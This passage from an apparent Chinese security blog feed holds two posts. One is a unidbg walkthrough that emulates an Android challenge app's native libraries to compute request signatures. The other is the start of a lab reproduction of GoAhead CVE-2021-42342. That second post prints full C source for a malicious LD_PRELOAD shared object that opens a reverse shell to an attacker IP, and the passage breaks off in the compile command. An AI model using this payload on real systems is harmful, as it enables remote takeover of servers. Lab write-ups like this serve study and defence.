alt="image-20220709123156188"></p><p>其中sign为加密后的字符串，搜索这个字符串，在包下面找相关的字段。</p><p>只有两处相关<code>com.yuanrenxue.match2022.fragment.challenge</code>和<code>com.yuanrenxue.match2022.security</code></p><p>在类<code>ChallengeTwoFragment</code>中可以看到明显的第二题代码，查看最后的sign的加密。加载了match02的so文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160658.png" alt="image-20220709130744364"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160659.png" alt="image-20220709130754983"></p><p>传入一个参数，类型为str，然后需要找个调用这个sign的地方，看上面的调用。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160700.png" alt="image-20220709140354427"></p><p>这里有两个需要注意，其中v0代表的是获取string中的资源，根据对应的查找发现是<code>%d:%d</code>。</p><p>还有一个是int类型的v1，其中 <code>this.OooO0O0</code>代表是page字段，这个在下面也有定义，<code>arg5.OooO00o()</code>赋值为long类型的v5，也就是这个是ts字段。所以v1就是一个page和ts的数组。</p><p>最后返回的时候，可以看到这个函数和一开始的是一致的。sign中的字符串格式化就是<code>String.format(&quot;%d:%d&quot;, &#123;page, ts&#125;)</code>。</p><p>知道传入sign的字符串参数的形式后，我们自己来调用so来输出。</p><pre class="line-numbers language-none"><code class="language-none">package com.misaki;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Module;import com.github.unidbg.arm.ARMEmulator;import com.github.unidbg.arm.backend.DynarmicFactory;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidARMEmulator;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.linux.android.dvm.jni.ProxyClassFactory;import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;import com.github.unidbg.memory.Memory;import java.io.File;import java.io.IOException;public class TestJni extends AbstractJni &#123;    &#x2F;&#x2F; ARM模拟器    private final AndroidEmulator emulator;    &#x2F;&#x2F; vm    private final VM vm;    &#x2F;&#x2F; 载入的模块    private final Module module;        private final DvmClass TTEncryptUtils;    public TestJni(String soFilePath, String classPath) throws IOException &#123;        emulator &#x3D; AndroidEmulatorBuilder                        .for64Bit()                        .addBackendFactory(new Unicorn2Factory(true))                        .setProcessName(&quot;com.yuanrenxue.match2022&quot;)                        .build();        Memory memory &#x3D; emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm &#x3D; emulator.createDalvikVM((File) null);        vm.setDvmClassFactory(new ProxyClassFactory());        vm.setVerbose(true);        vm.setJni(this);        DalvikModule dm &#x3D; vm.loadLibrary(new File(soFilePath), true);        dm.callJNI_OnLoad(emulator);        module &#x3D; dm.getModule();        TTEncryptUtils &#x3D; vm.resolveClass(classPath);    &#125;    private String myJni(String methodSign, Object ...args) &#123;        Object value &#x3D; TTEncryptUtils.callStaticJniMethodObject(emulator, methodSign, args).getValue();        return value.toString();    &#125;    private void destroy() throws IOException &#123;        emulator.close();        System.out.println(&quot;emulator destroy...&quot;);    &#125;    public static void main(String[] args) throws IOException &#123;        String soFilePath &#x3D; &quot;unidbg-android&#x2F;src&#x2F;test&#x2F;resources&#x2F;myso&#x2F;libmatch02.so&quot;;        String classPath &#x3D; &quot;com&#x2F;yuanrenxue&#x2F;match2022&#x2F;fragment&#x2F;challenge&#x2F;ChallengeTwoFragment&quot;;        String methodSign &#x3D; &quot;sign(java&#x2F;lang&#x2F;String;)java&#x2F;lang&#x2F;String;&quot;;        TestJni testJni &#x3D; new TestJni(soFilePath, classPath);        System.err.println(testJni.myJni(methodSign,&quot;1:1657348328&quot;));));        testJni.destroy();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160701.png" alt="image-20220709144802020"></p><p>然后再来看一下第四题，这个看完后发现基本跟第二题没太大区别。同样找到sign方法，里面有两个参数，去找这两个参数对应的值。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160702.png" alt="image-20220709152257853"></p><p>代码为：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> lambda$initListeners$<span class="token function">0</span><span class="token punctuation">(</span>o0000O arg8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0O0</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> v1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> v3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token number">0x7F100053</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// string:format_match_04_sign "%d:%d"</span>        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> v4 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0O0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">oOO00O<span class="token punctuation">.</span></span>OooO0O0<span class="token punctuation">.</span>OooO0O0</span> v3_1 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">oOO00O<span class="token punctuation">.</span></span>OooO0O0<span class="token punctuation">.</span>OooO0oO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">OooO00o</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0O0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OooO0O0</span> v1_1 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0Oo</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yuanrenxue<span class="token punctuation">.</span>match2022<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span></span>ChallengeFourFragment<span class="token punctuation">.</span>OooO00o</span> v2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">o00O0<span class="token punctuation">.</span></span>OooO0O0</span><span class="token punctuation">(</span>arg8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token keyword">final</span> o0000O <span class="token class-name">OooO0O0</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token class-name">ChallengeFourFragment</span> <span class="token class-name">OooO0OO</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name"><span class="token namespace">o00o00o<span class="token punctuation">.</span></span>OooOo00<span class="token punctuation">.</span>OooO00o</span> <span class="token class-name">OooO0Oo</span><span class="token punctuation">;</span>            <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yuanrenxue<span class="token punctuation">.</span>match2022<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span></span>ChallengeFourFragment<span class="token punctuation">.</span>OooO00o<span class="token punctuation">.</span>OooO0OO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#123;</span>                <span class="token class-name">ChallengeFourFragment</span><span class="token punctuation">.</span><span class="token keyword">this</span> <span class="token operator">=</span> arg1<span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0O0</span> <span class="token operator">=</span> arg2<span class="token punctuation">;</span>                <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>  <span class="token comment">// o00O0.OooO0O0</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">OooO0O0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0O0<span class="token punctuation">.</span>OooO0O0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>  <span class="token comment">// o00O0.OooO0O0</span>            <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">OooO0OO</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">OooO</span> v8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OooO</span><span class="token punctuation">(</span><span class="token string">"ChallengeFourFragment.java"</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yuanrenxue<span class="token punctuation">.</span>match2022<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span></span>ChallengeFourFragment<span class="token punctuation">.</span>OooO00o</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yuanrenxue<span class="token punctuation">.</span>match2022<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span></span>ChallengeFourFragment<span class="token punctuation">.</span>OooO00o<span class="token punctuation">.</span>OooO0Oo</span> <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">v8<span class="token punctuation">.</span></span>OooO0oO</span><span class="token punctuation">(</span><span class="token string">"method-execution"</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">v8<span class="token punctuation">.</span></span>OooO0o</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"onError"</span><span class="token punctuation">,</span> <span class="token string">"com.yuanrenxue.match2022.fragment.challenge.ChallengeFourFragment$1"</span><span class="token punctuation">,</span> <span class="token string">"java.lang.Throwable"</span><span class="token punctuation">,</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"void"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token class-name">OooO0o</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yuanrenxue<span class="token punctuation">.</span>match2022<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span></span>ChallengeFourFragment<span class="token punctuation">.</span>OooO00o</span> arg0<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> arg1<span class="token punctuation">,</span> <span class="token class-name">OooOo00</span> arg2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                arg0<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onError</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">;</span>                arg1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">arg0<span class="token punctuation">.</span></span>OooO0O0<span class="token punctuation">.</span>OooO0O0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>  <span class="token comment">// o00O0.OooO0O0</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">OooO0o0</span><span class="token punctuation">(</span><span class="token class-name">Object</span> arg1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0oO</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">oOO00O<span class="token punctuation">.</span></span>OooO0OO</span><span class="token punctuation">)</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">OooO0oO</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">oOO00O<span class="token punctuation">.</span></span>OooO0OO</span> arg5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">ArrayList</span> v0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                v0<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">o00O000<span class="token punctuation">.</span></span>OooO0OO</span><span class="token punctuation">(</span><span class="token string">"padding"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Iterator</span> v5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">arg5<span class="token punctuation">.</span></span>OooO0O0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>v5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    v5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    v0<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">o00O000<span class="token punctuation">.</span></span>OooO0OO</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">ChallengeFourFragment<span class="token punctuation">.</span>OooO</span><span class="token punctuation">(</span><span class="token class-name">ChallengeFourFragment</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">OooO</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0O0<span class="token punctuation">.</span>OooO0O0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>  <span class="token comment">// o00O0.OooO0O0</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onError</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> arg5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">OooOo00</span> v0 <span class="token operator">=</span> <span class="token class-name">OooO<span class="token punctuation">.</span>OooO0OO</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yuanrenxue<span class="token punctuation">.</span>match2022<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span></span>ChallengeFourFragment<span class="token punctuation">.</span>OooO00o<span class="token punctuation">.</span>OooO0Oo</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> arg5<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">o000O0<span class="token punctuation">.</span></span>OooO0OO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">OooO0O0</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OooOOO0</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">,</span> arg5<span class="token punctuation">,</span> v0<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">OooO0O0</span><span class="token punctuation">(</span><span class="token number">0x11010</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">v1_1<span class="token punctuation">.</span></span>OooO0OO</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">oOO00O<span class="token punctuation">.</span></span>OooO0O0</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">v3_1<span class="token punctuation">.</span></span>OooO0O0</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">OooO0OO</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是字符串格式化，还是<code>%d:%d</code>类型的格式化，但是参数变了。v4是<code>&#123;((int)this.OooO0O0), ((long)v1)&#125;</code>，而<code>this.OooO0O0</code>上面有赋值，应该也还是page，v1是<code>System.currentTimeMillis()</code>，获取当前的总毫秒数。所以第一页的时候，v4就是<code>&#123;1:1657351690000&#125;</code>。</p><p>所以sign的传参就是<code>this.sign(String.format(&quot;%d:%d&quot;, &#123;1,1657351690000&#125;), 1657351690000)</code></p><p>修改上面的Java代码来调用。</p><pre class="line-numbers language-none"><code class="language-none">package com.misaki;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Module;import com.github.unidbg.arm.backend.DynarmicFactory;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.linux.android.dvm.jni.ProxyClassFactory;import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;import com.github.unidbg.memory.Memory;import java.io.File;import java.io.IOException;public class TestJni extends AbstractJni &#123;    &#x2F;&#x2F; ARM模拟器    private final AndroidEmulator emulator;    &#x2F;&#x2F; vm    private final VM vm;    &#x2F;&#x2F; 载入的模块    private final Module module;    private final DvmClass TTEncryptUtils;    public TestJni(String soFilePath, String classPath) throws IOException &#123;        emulator &#x3D; AndroidEmulatorBuilder                        .for64Bit()                        .addBackendFactory(new DynarmicFactory(true))                        .setProcessName(&quot;com.yuanrenxue.match2022&quot;)                        .build();        Memory memory &#x3D; emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm &#x3D; emulator.createDalvikVM((File) null);        vm.setDvmClassFactory(new ProxyClassFactory());        vm.setVerbose(true);        vm.setJni(this);        DalvikModule dm &#x3D; vm.loadLibrary(new File(soFilePath), true);        dm.callJNI_OnLoad(emulator);        module &#x3D; dm.getModule();        TTEncryptUtils &#x3D; vm.resolveClass(classPath);    &#125;    private String myJni(String methodSign, String data1, Long data2) &#123;        Object value &#x3D; TTEncryptUtils.callStaticJniMethodObject(emulator, methodSign, data1, data2).getValue();        return value.toString();    &#125;    private void destroy() throws IOException &#123;        emulator.close();        System.out.println(&quot;emulator destroy...&quot;);    &#125;    public static void main(String[] args) throws IOException &#123;        String soFilePath &#x3D; &quot;unidbg-android&#x2F;src&#x2F;test&#x2F;resources&#x2F;myso&#x2F;libmatch04.so&quot;;        String classPath &#x3D; &quot;com&#x2F;yuanrenxue&#x2F;match2022&#x2F;fragment&#x2F;challenge&#x2F;ChallengeFourFragment&quot;;        String methodSign &#x3D; &quot;sign(java&#x2F;lang&#x2F;String;J)java&#x2F;lang&#x2F;String;&quot;;        TestJni testJni &#x3D; new TestJni(soFilePath, classPath);        System.err.println(testJni.myJni(methodSign,&quot;1:1657351690000&quot;, 1657351690000L));));        testJni.destroy();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160703.png" alt="image-20220709154136336"></p><p><strong>备注：</strong></p><p>这里是记录一些类型的描述符，方便后续修改查询</p><table><thead><tr><th align="center">变量类型</th><th align="center">类型描述符</th><th align="center">包装类</th><th align="center">包装类类型描述符(包含分号)</th></tr></thead><tbody><tr><td align="center">int</td><td align="center">I(大写i)</td><td align="center">Integer</td><td align="center">Ljava&#x2F;lang&#x2F;Integer;</td></tr><tr><td align="center">short</td><td align="center">S</td><td align="center">Short</td><td align="center">Ljava&#x2F;lang&#x2F;Short;</td></tr><tr><td align="center">long</td><td align="center">J</td><td align="center">Long</td><td align="center">Ljava&#x2F;lang&#x2F;Long;</td></tr><tr><td align="center">boolean</td><td align="center">Z</td><td align="center">Boolean</td><td align="center">Ljava&#x2F;lang&#x2F;Boolean;</td></tr><tr><td align="center">char</td><td align="center">C</td><td align="center">Character</td><td align="center">Ljava&#x2F;lang&#x2F;Character;</td></tr><tr><td align="center">byte</td><td align="center">B</td><td align="center">Byte</td><td align="center">Ljava&#x2F;lang&#x2F;Byte;</td></tr><tr><td align="center">float</td><td align="center">F</td><td align="center">Float</td><td align="center">Ljava&#x2F;lang&#x2F;Float;</td></tr><tr><td align="center">double</td><td align="center">D</td><td align="center">Double</td><td align="center">Ljava&#x2F;lang&#x2F;Double;</td></tr><tr><td align="center">void</td><td align="center">V</td><td align="center">Void</td><td align="center">Ljava&#x2F;lang&#x2F;Void;</td></tr><tr><td align="center">Object</td><td align="center">L+类名(使用’&#x2F;‘作为分隔符)+;如: Ljava&#x2F;lang&#x2F;Object;Lorg&#x2F;objectweb&#x2F;asm&#x2F;MethodVisitor;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">String</td><td align="center">Ljava&#x2F;lang&#x2F;String;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">————–</td><td align="center">数组写法:</td><td align="center">——–</td><td align="center">—————-</td></tr><tr><td align="center">X的N维数组</td><td align="center">N个[+X的类型描述符</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">int[]</td><td align="center">[I(大写的i)</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">byte[][]</td><td align="center">[[B</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">String[]</td><td align="center">[Ljava&#x2F;lang&#x2F;String;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">Object[][]</td><td align="center">[[Ljava&#x2F;lang&#x2F;Object;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr></tbody></table><p>方法描述符</p><table><thead><tr><th align="center">源文件中的方法声明</th><th align="center">方法描述符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">void m(int i, float f)</td><td align="center">(IF)V</td><td align="center">接收一个int和float型参数且无返回值</td></tr><tr><td align="center">int m(Object o)</td><td align="center">(Ljava&#x2F;lang&#x2F;Object;)I</td><td align="center">接收Object型参数返回int</td></tr><tr><td align="center">int[] m(int i, String s)</td><td align="center">(ILjava&#x2F;lang&#x2F;String;)[I</td><td align="center">接受int和String返回一个int[]</td></tr><tr><td align="center">Object m(int[] i)</td><td align="center">([I)Ljava&#x2F;lang&#x2F;Object;</td><td align="center">接受一个int[]返回Object</td></tr></tbody></table><p><strong>参考文章</strong></p><p><a href="https://zhuanlan.zhihu.com/p/407839659">https://zhuanlan.zhihu.com/p/407839659</a></p><p><a href="https://zhuanlan.zhihu.com/p/425355837">https://zhuanlan.zhihu.com/p/425355837</a></p><p><a href="https://mp.weixin.qq.com/s/CXsbzt4IWyDaV006JdIYsQ">https://mp.weixin.qq.com/s/CXsbzt4IWyDaV006JdIYsQ</a></p><p><a href="https://www.52pojie.cn/thread-1322512-1-1.html">https://www.52pojie.cn/thread-1322512-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;下载unidbg&quot;&gt;&lt;a href=&quot;#下载unidbg&quot; class=&quot;headerlink&quot; title=&quot;下载unidbg&quot;&gt;&lt;/a&gt;下载unidbg&lt;/h3&gt;&lt;p&gt;地址：&lt;a href=&quot;https://github.com/zhkl0228/unidbg
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>LD_PRELOAD变量注入</title>
    <link href="https://misakikata.github.io/2022/07/LD-PRELOAD%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
    <id>https://misakikata.github.io/2022/07/LD-PRELOAD变量注入/</id>
    <published>2022-07-01T10:31:39.000Z</published>
    <updated>2022-07-01T10:31:39.251Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境变量注入"><a href="#环境变量注入" class="headerlink" title="环境变量注入"></a>环境变量注入</h3><p>前两天看到一个ACTF的WP，由于没有参加，所以不太清楚题目，但是其中有一个gogogo的题目，利用的是环境变量的注入方式，而且还是LD_PRELOAD劫持。这个漏洞是GoAhead的一个CVE-2021-42342。</p><h3 id="CVE-2021-42342"><a href="#CVE-2021-42342" class="headerlink" title="CVE-2021-42342"></a>CVE-2021-42342</h3><p>先复现一下这个漏洞，直接利用vulhub的靶场，<code>/vulhub/goahead/CVE-2021-42342</code>。</p><p>访问<code>http://127.0.0.1:8080/cgi-bin/index</code>，在这个地方上传一个恶意的so文件。</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys&#x2F;socket.h&gt;#include&lt;netinet&#x2F;in.h&gt;char *server_ip&#x3D;&quot;192.168.36.138&quot;;uint32_t server_port&#x3D;1234;static void reverse_shell(void) __attribute__((constructor));static void reverse_shell(void)&#123;    int sock &#x3D; socket(AF_INET, SOCK_STREAM, 0);    struct sockaddr_in attacker_addr &#x3D; &#123;0&#125;;    attacker_addr.sin_family &#x3D; AF_INET;    attacker_addr.sin_port &#x3D; htons(server_port);    attacker_addr.sin_addr.s_addr &#x3D; inet_addr(server_ip);    if(connect(sock, (struct sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!&#x3D;0)        exit(0);    dup2(sock, 0);    dup2(sock, 1);    dup2(sock, 2);    execve(&quot;&#x2F;bin&#x2F;bash&quot;, 0, 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译如上的文件</p><pre class="line-numbers language-none"><code class="language-none">gcc -s -shared -fPIC 